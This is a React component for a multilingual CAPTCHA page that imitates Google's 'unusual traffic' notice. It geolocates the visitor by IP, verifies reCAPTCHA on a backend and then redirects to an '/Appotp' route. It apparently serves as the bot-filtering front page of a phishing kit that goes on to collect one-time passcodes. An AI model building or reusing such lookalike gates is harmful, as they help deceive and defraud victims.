import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import ReCAPTCHA from "react-google-recaptcha";

// Translations object
const translations = {
  da: {
    aboutThisPage: "Om denne side",
    description: "Vores systemer har registreret usædvanlig trafik fra dit computernetværk. Denne side kontrollerer, om det virkelig er dig, der sender anmodningerne, og ikke en robot.",
    whyQuestion: "Hvorfor skete dette?",
    ipAddress: "IP-adresse",
    time: "Tid",
    url: "URL",
  },
  en: {
    aboutThisPage: "About this page",
    description: "Our systems have detected unusual traffic from your computer network. This page checks whether it's really you sending the requests, and not a robot.",
    whyQuestion: "Why did this happen?",
    ipAddress: "IP address",
    time: "Time",
    url: "URL",
  },
  ar: {
    aboutThisPage: "حول هذه الصفحة",
    description: "لقد اكتشفت أنظمتنا حركة مرور غير عادية من شبكة الكبيوتر الخاصة بك. تتحقق هذه الصفحة مما إذا كنت أنت حقًا من يرسل الطلبات وليس روبوتًا.",
    whyQuestion: "لماذا حدث هذا؟",
    ipAddress: "عنوان IP",
    time: "الوقت",
    url: "الرابط",
  },
  fr: {
    aboutThisPage: "À propos de cette page",
    description: "Nos systèmes ont détecté un trafic inhabituel depuis votre réseau informatique. Cette page vérifie si c'est vraiment vous qui envoyez les requêtes, et non un robot.",
    whyQuestion: "Pourquoi cela s'est-il produit ?",
    ipAddress: "Adresse IP",
    time: "Heure",
    url: "URL",
  },
  es: {
    aboutThisPage: "Acerca de esta página",
    description: "Nuestros sistemas han detectado tráfico inusual desde tu red informática. Esta página verifica si realmente eres tú quien envía las solicitudes y no un robot.",
    whyQuestion: "¿Por qué sucedió esto?",
    ipAddress: "Dirección IP",
    time: "Hora",
    url: "URL",
  },
  de: {
    aboutThisPage: "Über diese Seite",
    description: "Unsere Systeme haben ungewöhnlichen Verkehr aus Ihrem Computernetzwerk festgestellt. Diese Seite überprüft, ob wirklich Sie die Anfragen senden und nicht ein Roboter.",
    whyQuestion: "Warum ist das passiert?",
    ipAddress: "IP-Adresse",
    time: "Zeit",
    url: "URL",
  },
  pl: {
    aboutThisPage: "O tej stronie",
    description: "Nasze systemy wykryły nietypowy ruch z Twojej sieci komputerowej. Ta strona sprawdza, czy to naprawdę Ty wysyłasz żądania, a nie robot.",
    whyQuestion: "Dlaczego to się stało?",
    ipAddress: "Adres IP",
    time: "Czas",
    url: "URL",
  },
  sv: {
    aboutThisPage: "Om denna sida",
    description: "Våra system har upptäckt ovanlig trafik från ditt datornätverk. Den här sidan kontrollerar om det verkligen är du som skickar förfrågningarna och inte en robot.",
    whyQuestion: "Varför hände detta?",
    ipAddress: "IP-adress",
    time: "Tid",
    url: "URL",
  },
  no: {
    aboutThisPage: "Om denne siden",
    description: "Våre systemer har oppdaget uvanlig trafikk fra ditt datanettverk. Denne siden sjekker om det virkelig er deg som sender forespørslene, og ikke en robot.",
    whyQuestion: "Hvorfor skjedde dette?",
    ipAddress: "IP-adresse",
    time: "Tid",
    url: "URL",
  },
  nl: {
    aboutThisPage: "Over deze pagina",
    description: "Onze systemen hebben ongebruikelijk verkeer van uw computernetwerk gedetecteerd. Deze pagina controleert of u het echt bent die de verzoeken verzendt, en niet een robot.",
    whyQuestion: "Waarom is dit gebeurd?",
    ipAddress: "IP-adres",
    time: "Tijd",
    url: "URL",
  },
  nl_BE: {
    aboutThisPage: "Over deze pagina",
    description: "Onze systemen hebben ongebruikelijk verkeer van uw computernetwerk gedetecteerd. Deze pagina controleert of u het echt bent die de verzoeken verzendt, en niet een robot.",
    whyQuestion: "Waarom is dit gebeurd?",
    ipAddress: "IP-adres",
    time: "Tijd",
    url: "URL",
  },
  cs: {
    aboutThisPage: "O této stránce",
    description: "Naše systémy detekovaly neobvyklý provoz z vaší počítačové sítě. Tato stránka kontroluje, zda jste to skutečně vy, kdo odesílá požadavky, a ne robot.",
    whyQuestion: "Proč se to stalo?",
    ipAddress: "IP adresa",
    time: "Čas",
    url: "URL",
  },
  pt: {
    aboutThisPage: "Sobre esta página",
    description: "Os nossos sistemas detetaram tráfego incomum na sua rede de computadores. Esta página verifica se é realmente você a enviar os pedidos e não um robô.",
    whyQuestion: "Porque é que isto aconteceu?",
    ipAddress: "Endereço IP",
    time: "Hora",
    url: "URL",
  },
  mt: {
    aboutThisPage: "Dwar din il-paġna",
    description: "Is-sistemi tagħna skoprew traffiku mhux tas-soltu min-netwerk tal-kompjuter tiegħek. Din il-paġna tiċċekkja jekk intix verament int li qed tibgħat it-talbiet, u mhux robot.",
    whyQuestion: "Għaliex ġara dan?",
    ipAddress: "Indirizz IP",
    time: "Ħin",
    url: "URL",
  },
};

const apiUrl = import.meta.env.VITE_API_URL;

function CaptchaPage() {
  const navigate = useNavigate();
  const [captchaValue, setCaptchaValue] = useState(null);
  const [ip, setIp] = useState("");
  const [time, setTime] = useState("");
  const [language, setLanguage] = useState("da");
  const [isLoadingLang, setIsLoadingLang] = useState(true);
  const [isVerifying, setIsVerifying] = useState(false);

  // Function to detect language based on IP
  const detectLanguageByIP = async () => {
    try {
      const res = await fetch(`${apiUrl}/api/ipinfo`);
      const data = await res.json();

      const countryCode = data.country_code?.toLowerCase();

      const countryToLanguage = {
        'dk': 'da',
        'us': 'en',
        'gb': 'en',
        'ca': 'en',
        'au': 'en',
        'ae': 'ar',
        'sa': 'ar',
        'eg': 'ar',
        'fr': 'fr',
        'be': 'fr',
        'ch': 'fr',
        'es': 'es',
        'mx': 'es',
        'ar': 'es',
        'co': 'es',
        'de': 'de',
        'at': 'de',
        'tn': 'ar'
      };

      const detectedLang = countryToLanguage[countryCode] || 'da';

      setLanguage(detectedLang);
      localStorage.setItem('preferredLanguage', detectedLang);

    } catch (error) {
      console.error('Error detecting language:', error);

      const savedLang = localStorage.getItem('preferredLanguage');

      if (savedLang && translations[savedLang]) {
        setLanguage(savedLang);
      } else {
        const browserLang = navigator.language.split('-')[0];

        if (translations[browserLang]) {
          setLanguage(browserLang);
        } else {
          setLanguage('da');
        }
      }
    } finally {
      setIsLoadingLang(false);
    }
  };

  useEffect(() => {
    detectLanguageByIP();
  }, []);

  // Function to get translation
  const t = (key) => {
    if (translations[language] && translations[language][key]) {
      return translations[language][key];
    }
    return translations.en[key] || key;
  };

  // Fetch IP address
  useEffect(() => {
    const fetchIp = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        setIp(data.ip);
      } catch (error) {
        console.error('Error fetching IP:', error);
        setIp('Unable to fetch IP');
      }
    };
    fetchIp();
  }, []);

  // Update time every second
  useEffect(() => {
    const updateTime = () => {
      const now = new Date();
      let timeString;
      const localeMap = {
        'da': 'da-DK',
        'ar': 'ar-EG',
        'pl': 'pl-PL',
        'sv': 'sv-SE',
        'no': 'nb-NO',
        'nl': 'nl-NL',
        'nl_BE': 'nl-NL',
        'cs': 'cs-CZ',
        'pt': 'pt-PT',
        'mt': 'mt-MT',
      };
      
      const locale = localeMap[language] || 'en-US';
      timeString = now.toLocaleString(locale, {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        hour12: false
      });
      
      setTime(timeString);
    };

    updateTime();
    const interval = setInterval(updateTime, 1000);
    return () => clearInterval(interval);
  }, [language]);

  const handleCaptcha = async (value) => {
    setCaptchaValue(value);
    
    if (value) {
      setIsVerifying(true);
      
      try {
        const response = await fetch(`${apiUrl}/api/verify-captcha`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ token: value }),
        });
        
        const data = await response.json();
        
        if (data.success) {
          localStorage.setItem("captchaPassed", "true");
          navigate('/Appotp');
        } else {
          // Reset captcha widget on failure
          window.grecaptcha && window.grecaptcha.reset();
          setCaptchaValue(null);
        }
      } catch (error) {
        console.error('Verification error:', error);
        setCaptchaValue(null);
      } finally {
        setIsVerifying(false);
      }
    }
  };

  // Get reCAPTCHA language code
  const getRecaptchaLang = () => {
    const langMap = {
      'da': 'da',
      'en': 'en',
      'ar': 'ar',
      'fr': 'fr',
      'es': 'es',
      'de': 'de',
      'pl': 'pl',
      'sv': 'sv',
      'no': 'no',
      'nl': 'nl',
      'nl_BE': 'nl',
      'cs': 'cs',
      'pt': 'pt',
      'mt': 'mt',
    };
    return langMap[language] || 'en';
  };

  // Toggle info div
  const toggleInfoDiv = () => {
    const infoDiv = document.getElementById("infoDiv");
    if (infoDiv) {
      infoDiv.style.display = infoDiv.style.display === "none" ? "block" : "none";
    }
  };

  if (isLoadingLang) {
    return (
      <div
        style={{
          height: "100vh",
          backgroundColor: "white",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
        }}
      >
        <div>Loading...</div>
      </div>
    );
  }

  const isRTL = language === 'ar';

  return (
    <div
      style={{
        height: "100vh",
        backgroundColor: "white",
        display: "flex",
        alignItems: "flex-start",
        flexDirection: "column",
      }}
      dir={isRTL ? 'rtl' : 'ltr'}
    >
      <div
        className="captcha-divider"
        style={{
          margin: "28px",
          backgroundColor: "white",
          display: "flex",
          alignItems: "flex-start",
          flexDirection: "column",
        }}
      >
        <hr
          className="captcha-divider"
          style={{
            height: "1px",
            border: "none",
            background: "#808080",
            marginBottom: "20px",
          }}
        />

        <ReCAPTCHA
          sitekey="6LfbWEYtAAAAAEXg6FTMvRt4Qvy8vK9XUWHDVgxU"
          onChange={handleCaptcha}
          hl={getRecaptchaLang()}
        />

        <hr
          className="captcha-divider"
          style={{
            height: "1px",
            border: "none",
            background: "#808080",
            marginTop: "18px",
          }}
        />

        <div
          className="captcha-info"
          style={{
            fontFamily: "arial, sans-serif",
            fontSize: "13px",
            color: "rgb(0, 0, 0)",
            backgroundColor: "rgb(255, 255, 255)",
            textAlign: isRTL ? 'right' : 'left',
            width: "100%",
          }}
        >
          <b>{t("aboutThisPage")}</b>
          <br />
          <br />

          <span>{t("description")}</span>

          <a
            href="#"
            style={{
              fontFamily: "arial, sans-serif",
              fontSize: "13px",
              color: "blue",
              textDecoration: "underline",
              display: "inline-block",
              marginLeft: isRTL ? 0 : "5px",
              marginRight: isRTL ? "5px" : 0,
            }}
            onClick={(e) => {
              e.preventDefault();
              toggleInfoDiv();
            }}
          >
            {t("whyQuestion")}
          </a>

          <br />
          <br />

          <span>{t("ipAddress")}: {ip}</span>

          <br />

          <span>{t("time")}: {time}</span>

          <br />

          <div
            id="infoDiv"
            style={{ display: "none", marginTop: "20px" }}
          >
            {/* This div would contain additional information when clicked */}
          </div>
        </div>
      </div>
    </div>
  );
}

export default CaptchaPage;